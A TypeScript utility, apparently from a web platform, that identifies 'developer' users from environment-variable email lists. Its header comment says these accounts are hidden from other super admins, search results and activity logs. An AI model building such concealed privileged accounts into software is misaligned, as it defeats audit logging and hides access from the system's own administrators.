/**
 * Developer Identity & Concealment Utility
 *
 * The developer user is completely hidden across the platform.
 * Other super admins cannot see the developer user in tables, search results,
 * or activity logs. Developer accounts are protected against unauthorized modification.
 */

export function getDeveloperEmails(): string[] {
  const emails = new Set<string>();

  const rawEnv = process.env.DEVELOPER_EMAIL || process.env.NEXT_PUBLIC_DEVELOPER_EMAIL || "";
  if (rawEnv && typeof rawEnv === "string") {
    rawEnv
      .split(",")
      .map(e => e.trim().toLowerCase())
      .filter(Boolean)
      .forEach(e => emails.add(e));
  }

  return Array.from(emails);
}

export function isDeveloperEmail(email?: string | null): boolean {
  if (!email || typeof email !== "string") return false;
  const clean = email.trim().toLowerCase();
  const devEmails = getDeveloperEmails();
  return devEmails.includes(clean);
}

export function isDeveloperUser(user?: { email?: string | null; isDeveloper?: boolean } | null): boolean {
  if (!user) return false;
  if (user.isDeveloper === true) return true;
  return isDeveloperEmail(user.email);
}
